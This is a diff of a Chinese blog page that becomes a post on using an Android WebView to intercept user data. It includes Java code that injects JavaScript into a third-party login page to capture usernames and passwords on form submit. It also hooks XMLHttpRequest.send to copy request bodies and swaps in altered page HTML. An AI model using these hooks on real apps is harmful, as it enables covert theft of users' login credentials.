@@ -2,7 +2,7 @@
 <html>
 <head>
   <title>
-    Kael 的日常
+    利用webview拦截并获取用户数据 - Kael 的日常
   </title>
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -71,38 +71,90 @@
 
   <div class="main">
     
-<link rel="stylesheet" href="/css/tags.css">
+<link rel="stylesheet" href="/css/post.css">
 
-<h1>标签</h1>
+<post>
 
-<div class="tags">
-  
-  <div class="singletag">
-    <a class="tag_link" href="/tags/序言">序言</a>
+  <div class="post_title">
+    利用webview拦截并获取用户数据
   </div>
-  
-  <div class="singletag">
-    <a class="tag_link" href="/tags/读书">读书</a>
+
+  <br/><br/>
+
+  <div id="post_content">
+    <h3 id="起源"><a href="#起源" class="headerlink" title="起源"></a>起源</h3><p>公司最近有个需求是拿到某APP第三方平台授权后的返回给该APP的一个authcode数据、经分析该app嵌套了一个webview、在webview的页面里进行授权拿到数据后(sdklite://h5quit?result=xxx)返回给App、也算是混合编程吧、顺着他的思路我们也实现一个这样的app、做的是安卓版、因为比较熟悉点、这边主要是记录一下几个技术点。</p>
+<h3 id="webview里抓get请求提交数据"><a href="#webview里抓get请求提交数据" class="headerlink" title="webview里抓get请求提交数据"></a>webview里抓get请求提交数据</h3><p>重载WebViewClient的此函数<code>public final WebResourceResponse shouldInterceptRequest(final WebView view, WebResourceRequest request)</code>、函数体内获取<code>request.getUrl()</code>即可获取get请求的参数。</p>
+<h3 id="webview里抓post请求提交参数"><a href="#webview里抓post请求提交参数" class="headerlink" title="webview里抓post请求提交参数"></a>webview里抓post请求提交参数</h3><p>官方没有提供这样的方法、只能自己实现、参考了github上的几个项目、这里分为两种情况、form提交数据和ajax提交的数据、思路是不变的、页面里注入一个js、然后hook一下提交的点、js里拿到数据后调用Android函数传递。</p>
+<h4 id="form提交"><a href="#form提交" class="headerlink" title="form提交"></a>form提交</h4><p>这里需要响应一下form的onsubmit事件就可以了、这是我在重载的onPageFinished函数里嵌入的JavaScript代码、用来获取用户提交form数据。</p>
+<pre><code>@Override
+   public void onPageFinished(WebView view, String url) {
+       super.onPageFinished(view, url);
+       System.out.println(&quot;page finished&quot;);
+       StringBuilder sb = new StringBuilder();
+       sb.append(&quot;var formxxx = document.getElementById(&apos;login-form&apos;);&quot;);
+       sb.append(&quot;if(!(formxxx === undefined || formxxx === null)){&quot;);
+       sb.append(&quot; formxxx.onsubmit = function () {&quot;);
+       sb.append(&quot;     var objPWD, objAccount;var str = &apos;&apos;;&quot;);
+       sb.append(&quot;     objAccount = formxxx.username;&quot;);
+       sb.append(&quot;     objPWD = formxxx.password;&quot;);
+       sb.append(&quot;     str = &apos;account：&apos; + objAccount.value + &apos;|password：&apos; + objPWD.value;&quot;);
+       sb.append(&quot;     alert(str);&quot;);
+       sb.append(&quot;     window.MYOBJECT.processHTML(str);&quot;);
+       sb.append(&quot;     return true;&quot;);
+       sb.append(&quot; };&quot;);
+       sb.append(&quot;}&quot;);
+       view.loadUrl(&quot;javascript:&quot; + sb.toString());
+   }</code></pre><p>这里的<code>window.MYOBJECT.processHTML(str);</code>这句代码调用的Android的函数、定义如下：</p>
+<pre><code>class MyJavaScriptInterface {
+    @JavascriptInterface
+    public void processHTML(String html) {
+        System.out.println(&quot;Android :&quot; + html);
+    }
+}    </code></pre><h4 id="ajax提交"><a href="#ajax提交" class="headerlink" title="ajax提交"></a>ajax提交</h4><p>先贴一下ajax提交hook的js</p>
+<pre><code>&lt;script language=&quot;JavaScript&quot;&gt;
+    XMLHttpRequest.prototype.reallySend = XMLHttpRequest.prototype.send;
+    XMLHttpRequest.prototype.send = function(body) {
+        MYOBJECT.customAjax(body);
+        this.reallySend(body);
+    };
+&lt;/script&gt;</code></pre><p>这里不是在onPageFinished里注入的(理论上也是可以的)、而是重载了<code>public final WebResourceResponse shouldInterceptRequest(final WebView view,WebResourceRequest request)</code>这个函数、如果该函数返回null、则webview会默认自己处理、如果返回的是我们自定义的WebResourceResponse资源、webview会替换掉原来的返回。所以这里的实现是当目标是我们要hook的页面时候、自己代码获取一下页面html代码、把hook的js代码拼接进去、然后组成一个WebResourceResponse资源返回给webview。</p>
+<pre><code>@Override
+public final WebResourceResponse shouldInterceptRequest(
+        final WebView view,
+        WebResourceRequest request
+) {
+    //判断是否是敏感信息页面
+    if(request.getUrl().toString().contains(&quot;login&quot;)){
+        //自己获取一下登陆页面的html
+        WebResourceResponse webResourceResponse = getLoginHtml(view, request);
+        //拼接html和js并返回
+        return merge2Js(webResourceResponse, view.getContext());
+    }
+    //默认处理
+    return null;
+}</code></pre><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>在经过apk包装后的第三方页面上提交的数据是可以截取的、返回的资源也能替换、其作用不言而喻。</p>
+
   </div>
+
+  <br/>
+
   
-  <div class="singletag">
-    <a class="tag_link" href="/tags/活着">活着</a>
-  </div>
+  <br/><br/>
+
+
   
-  <div class="singletag">
-    <a class="tag_link" href="/tags/余华">余华</a>
-  </div>
-  
-  <div class="singletag">
-    <a class="tag_link" href="/tags/Dota2">Dota2</a>
-  </div>
-  
-  <div class="singletag">
-    <a class="tag_link" href="/tags/Android">Android</a>
-  </div>
-  
+
+  <div id="top">
+    <a href="#">▲</a>
+    <a href="#footer">▼</a>
 </div>
-<br/><br/><br/><br/><br/><br/>
+
+  
+    <div id="vcomments" style="width: 100%; margin: 0 auto;"></div>
+
+
+
+</post>
 
   </div>
 
